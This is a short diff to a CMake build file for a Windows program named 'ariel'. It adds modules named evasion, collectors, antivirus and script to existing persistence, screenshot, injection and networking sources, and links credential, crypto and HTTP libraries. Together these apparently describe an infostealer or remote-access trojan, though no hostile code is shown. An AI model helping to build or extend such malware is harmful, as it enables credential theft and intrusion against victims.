@@ -31,7 +31,11 @@ add_executable(ariel
   src/net.cpp
   src/persist.cpp
   src/screenshot.cpp
-  src/injection.cpp)
+  src/injection.cpp
+  src/evasion.cpp
+  src/collectors.cpp
+  src/antivirus.cpp
+  src/script.cpp)
 
 if(EXISTS "${CMAKE_CURRENT_SOURCE_DIR}/src/ariel.rc")
   target_sources(ariel PRIVATE "${CMAKE_CURRENT_SOURCE_DIR}/src/ariel.rc")
@@ -46,7 +50,7 @@ set_target_properties(ariel PROPERTIES
 
 target_include_directories(ariel PRIVATE src)
 target_compile_definitions(ariel PRIVATE UNICODE _UNICODE WIN32_LEAN_AND_MEAN NOMINMAX)
-target_link_libraries(ariel PRIVATE sqlite3 bcrypt crypt32 winhttp advapi32 shell32 ole32 windowscodecs user32)
+target_link_libraries(ariel PRIVATE sqlite3 bcrypt crypt32 winhttp advapi32 shell32 ole32 windowscodecs user32 iphlpapi)
 
 if(MSVC)
   target_compile_options(ariel PRIVATE /EHa)
